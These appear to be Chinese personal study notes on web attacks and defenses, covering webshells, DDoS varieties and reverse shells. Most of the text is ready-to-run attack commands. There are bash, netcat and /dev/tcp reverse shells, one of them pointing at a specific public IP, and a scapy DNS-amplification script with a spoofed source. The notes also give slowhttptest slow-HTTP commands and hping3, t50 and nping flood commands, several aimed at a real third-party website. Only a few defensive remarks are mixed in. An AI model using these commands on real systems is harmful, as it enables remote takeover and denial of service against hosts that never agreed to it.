
刷登陆：频繁刷某个url，过滤并拉黑
cc攻击：
ddos：流量攻击，cdn，封ip，验证码
反弹：python -c 'import pty; pty.spawn("/bin/bash")'
      exec 9<> /dev/tcp/207.148.84.102/8008;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;^Mno
	  将相关依赖去除/别名 /exec/curl/wget/tty/socket,subprocess模块..
计划任务    家目录     passwd/shadow   --- i权限
关键命令及文件的MD5校验

文件上传限制/检查
程序的解析原理：
url的post暴力尝试，根据报错推测   # 不使用通用的url路径(admin)和数据库的库名(admin)，提高密码复杂度，不允许多次尝试和错误页面处理
文件包含include/命令注入:将所包含的文件变成url传入参数(例如日志记录了攻击语句/图片)使其执行
菜刀：用来连接shell的工具（命令执行）    webshell：访问url获取目标主机的目录结构（上传文件）


端口探测:掌握端口信息。对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法
webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。


端口反弹：多种语言都能实现(防火墙需要开放端口，默认是不开放的)
shell:
1.连接端：nc -lvp 7777
2.被连接端：bash -i >& /dev/tcp/192.168.3.107/7777 0>&1
  bash -i代表在本地当前shell打开另一个shell， /dev/tcp/(/dev/tcp/ip/port)是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用
  >&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件,即传递到远程上 
  该命令后面加上0>&1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程

netcat: nc 127.0.0.1 80  连接到某主机的某端口
1.连接端：nc -lvp 7777
2.被连接端：nc -e /bin/bash 192.168.0.4 7777
  -e后面跟的参数代表的是在创建连接后执行的程序
  【nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777 管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口】

1.连接端：nc -lvp 7777
2.被连接端：whois -h 192.168.118.119 -p 7777 `ifconfig`    #连接上后执行命令
  
python:  
php：  


DDOS（分布式拒绝服务）:ip攻击，处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击
CC攻击是DDOS的一种形式：网页攻击，访问页面
IP Spoofing：IP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的，使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。
SYN floods：发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽
LAND attack：攻击包中的原地址和目标地址都是攻击对象的IP。这种攻击会导致被攻击的机器死循环，最终耗尽资源而死机
ICMP floods：ICMPfloods是通过向未良好设置的路由器发送广播信息占用系统资源的做法。
Application level floods主要是针对应用软件层的


硬件防火墙是指把防火墙程序做到芯片里面，由硬件执行这些功能，能减少CPU的负担，使路由更稳定


########################################################################

https://www.bilibili.com/video/BV17E411471J?p=5
ddos：分布式拒绝服务攻击

dns放大攻击：
	原理：发送小流量回复大流量
	步骤：1.伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询
	      2.dns服务器成为流量发达和实施攻击者，向大量dns服务器请求实现ddos
snmp放大攻击：
ntp放大攻击

scapy构造攻击数据包
	i=IP()
	i.display()
	i.dst="202.106.0.20"    #dns服务器
	u=UDP()
	u.display()
	d=DNS()
	d.display()
	d.rd=1  			    #dns递归查询
	d.qdcount=1
	q=DNSQR()               #定义dns数据包内容
	q.display()
	q.qname='qq.com'
	q.qtype=255
	q.display()
	d.qd=q                  #dns协议和数据包结合
	r=(i/u/d)               #将上面的数据结合起来
	r.display()
	sr1(1)                  #将数据包发出
	i.src='192.168.3.1'     #将源IP修改成攻击目标ip，这样回复数据就会发给目标ip
	r=(i/u/d)
	send(r)                 #发包

溢出：频繁使用应用层接口/命令，探测出漏洞

cc：大量频繁攻击消耗系统资源的应用
慢速攻击：耗尽应用层的并发连接
	软件：slowhttptest rudy
	原理：
		完整的http请求结尾是\r\n\r\n, 攻击发\r\n
		content-length声明长度，但body部分缓慢发送
		#GET方式：slowhttptest -c 1000 -H -g -o return.txt -i 10 -r 200 -t GET -u http://192.168.3.1 -x 24 -p 3 -l 99999
		#POST方式：slowhttptest -c 1000 -B -g -o return.txt -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.3.1 -x 10 -p 3
slow read attack攻击：慢速攻击的一种，区别是接受的时候耗着
hulk：随机产生大量唯一的地址路径请求


攻击模拟：
yum -y install libpcap-devel tcl-devel
git clone https://github.com/antirez/hping.git     
cd hping  &&  ./configure && make && make install
netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'
syn flood攻击：
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com
hping3 -S -P -U -p 80 --flood --rand-source www.baidu.com
tcp flood攻击：
hping3 -SARFUP -p 80 --flood --rand-source www.baidu.com
icmp攻击：
hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood www.baidu.com
udp攻击：
hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood www.baidu.com
LAND攻击：源地址和目标地址都是攻击者ip
hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood www.baidu.com

nmap包：
建立完整连接
	nping --tcp-connect --rate=10000 -c 1000000000 -q www.baidu.com
nmap脚本
cat /usr/share/nmap/scripts/script.db
	Entry { filename = "broadcast-avahi-dos.nse", categories = { "broadcast", "dos", "intrusive", "vuln", } }
					脚本名					  种类(后面是具体分类)
	使用：nmap -p22 --script=脚本名

压测：
siege -i -c 10000 http://192.168.3.128 -A ttt
t50 www.baidu.com --flood --turbo -S --protocol TCP --dport 80
t50 www.baidu.com --flood --turbo -S TCP UDP OSPF EIGRP --dport 22


https://github.com/jseidl/GoldenEye

